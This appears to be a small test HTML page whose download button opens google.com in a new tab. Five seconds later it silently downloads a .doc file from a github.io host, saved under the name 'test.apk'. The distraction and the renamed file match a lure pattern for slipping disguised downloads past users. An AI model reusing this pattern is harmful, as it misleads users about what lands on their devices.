<!doctype html>
<html>
<head>
  <style>
    html { font-family: sans-serif; }
    body { display: flex; justify-content: center; align-items: center; height: 100vh; }
    button { padding: 20px; font-size: 18px; cursor: pointer; }
  </style>
</head>
<body>

<button id="downloadBtn">Click me to download</button>

<script>
document.getElementById('downloadBtn').addEventListener('click', () => {
    // Open a site in a new tab
    window.open('https://google.com', '_blank');

    // Trigger a download after 5 seconds
    setTimeout(() => {
        const link = document.createElement('a');
        link.href = 'https://lowleveljody.github.io/Secretplayground/aaaa.doc';
        link.download = 'test.apk'; // Suggest filename
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }, 5000);
});
</script>

</body>
</html>
